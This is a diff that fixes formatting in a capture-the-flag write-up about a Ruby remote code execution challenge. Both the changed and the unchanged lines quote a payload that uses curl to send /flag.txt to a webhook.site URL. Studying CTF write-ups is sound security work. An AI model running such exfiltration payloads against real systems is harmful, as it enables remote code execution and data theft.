@@ -1118,7 +1118,6 @@ Well, it seems like another dead end. But now I’ll show the exploit for the se
 
 ``puts `curl https://webhook.site/86339640-ac95-46ef-8afc-1a8fbaa9776b?msg=$(cat /flag.txt)` ``
 
-
 - Then we'll send move on to the second part wherein we'll send the output of the following script as ``user_string``
 (This is the exploit for the second part)
 ```ruby
@@ -1158,7 +1157,7 @@ So when it appends the string ``_command`` to our ``key``, it becomes ``rubygems
 
 This means that the internal server will include our file, and boom — RCE!!!!!! Ruby will evaluate the contents of the file that was just loaded into ObjectSpace by the ``require`` call. In this case, the executed code was:  
 
-``puts `curl https://webhook.site/86339640-ac95-46ef-8afc-1a8fbaa9776b?msg=$(cat /flag.txt)``
+``puts `curl https://webhook.site/86339640-ac95-46ef-8afc-1a8fbaa9776b?msg=$(cat /flag.txt)` ``
   
 This is our RCE payload, and hence we’ll get the flag in our webhook.  
 
